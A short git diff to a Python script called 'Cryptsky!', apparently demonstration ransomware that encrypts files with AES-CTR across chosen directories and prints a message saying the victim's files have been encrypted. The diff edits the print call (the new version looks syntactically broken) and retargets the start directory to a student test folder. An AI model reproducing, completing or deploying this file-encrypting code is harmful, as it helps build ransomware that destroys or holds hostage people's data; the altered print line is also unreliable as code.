@@ -27,7 +27,7 @@ def main():
     decrypt = args['decrypt']
 
     if decrypt:
-        print '''
+        print (''')
 Cryptsky!
 ---------------
 Your files have been encrypted. This is normally the part where I would
@@ -60,7 +60,7 @@ Your decryption key is: '{}'
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
 
     # change this to fit your needs.
-    startdirs = ['/home/guillermo/Desktop/Prueba']
+    startdirs = ['/home/student/Desktop/Prueba']
 
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
